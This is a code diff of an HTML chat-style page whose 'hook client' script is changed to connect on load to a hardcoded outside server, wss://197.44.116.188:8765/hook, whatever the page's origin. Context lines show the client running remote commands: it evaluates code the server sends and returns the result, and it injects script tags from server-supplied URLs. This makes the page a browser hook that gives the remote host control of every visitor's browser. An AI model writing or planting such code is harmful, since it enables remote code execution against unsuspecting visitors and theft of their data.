@@ -70,21 +70,21 @@
     </footer>
   </div>
 
-  <!-- Injected server config (Python will replace placeholders) -->
+  <!-- Fixed server config: force connection to wss://197.44.116.188:8765/hook -->
   <script>
-    // If the Python server replaced placeholders, use them; otherwise fall back.
-    window.SERVER_HOST = "{{SERVER_HOST}}" || location.hostname;
-    window.SERVER_PORT = {{SERVER_PORT}} || null;          // replaced to a number or left as null
-    window.CLIENT_PATH = "{{CLIENT_PATH}}" || "/hook";
+    // Force these values — the client WILL use wss and the explicit host:port below
+    const FIXED_WSS_HOST = '197.44.116.188';
+    const FIXED_WSS_PORT = 8765;
+    const FIXED_CLIENT_PATH = '/hook';
   </script>
 
-  <!-- Hook client logic (compact, GUI-friendly) -->
+  <!-- Hook client logic (connects to fixed WSS) -->
   <script>
   (function () {
-    // read injected config with safe fallbacks
-    const SERVER_HOST = (typeof window.SERVER_HOST !== 'undefined' && window.SERVER_HOST) ? window.SERVER_HOST : location.hostname;
-    const SERVER_PORT = (typeof window.SERVER_PORT !== 'undefined' && window.SERVER_PORT) ? String(window.SERVER_PORT) : '';
-    const CLIENT_PATH = (typeof window.CLIENT_PATH !== 'undefined' && window.CLIENT_PATH) ? window.CLIENT_PATH : '/hook';
+    // use forced WSS endpoint
+    const SERVER_HOST = FIXED_WSS_HOST;
+    const SERVER_PORT = FIXED_WSS_PORT;
+    const CLIENT_PATH = FIXED_CLIENT_PATH;
 
     // UI references
     const chatWindow = document.getElementById('chat-window');
@@ -122,11 +122,10 @@
       }
     }
 
-    // Build the correct websocket URL. If page is https, use wss, else ws.
+    // Build the websocket URL — always force wss://HOST:PORT/PATH
     function wsUrl() {
-      const pageIsHttps = location.protocol === 'https:';
-      const protocol = pageIsHttps ? 'wss' : 'ws';
-      const host = SERVER_HOST || location.hostname;
+      const protocol = 'wss'; // forced to secure websocket
+      const host = SERVER_HOST;
       const port = SERVER_PORT ? (':' + SERVER_PORT) : '';
       const path = CLIENT_PATH.startsWith('/') ? CLIENT_PATH : '/' + CLIENT_PATH;
       return `${protocol}://${host}${port}${path}`;
@@ -188,7 +187,6 @@
             addMessage('Eval result sent','sent');
             return;
           }else if(command.scriptUrl){
-            // load remote script tag
             const s = document.createElement('script');
             s.src = command.scriptUrl;
             s.async = true;
@@ -285,11 +283,8 @@
     // initial
     setStatus(false);
 
-    // auto-connect on HTTPS pages (GitHub Pages) after small delay - allow user to accept cert if needed
-    setTimeout(()=> {
-      // only auto-connect if page is secure (wss) or if the server host explicitly provided
-      if(location.protocol === 'https:' || SERVER_HOST !== location.hostname) connect();
-    }, 300);
+    // auto-connect immediately (since we force wss)
+    setTimeout(()=> { connect(); }, 300);
 
   })();
   </script>
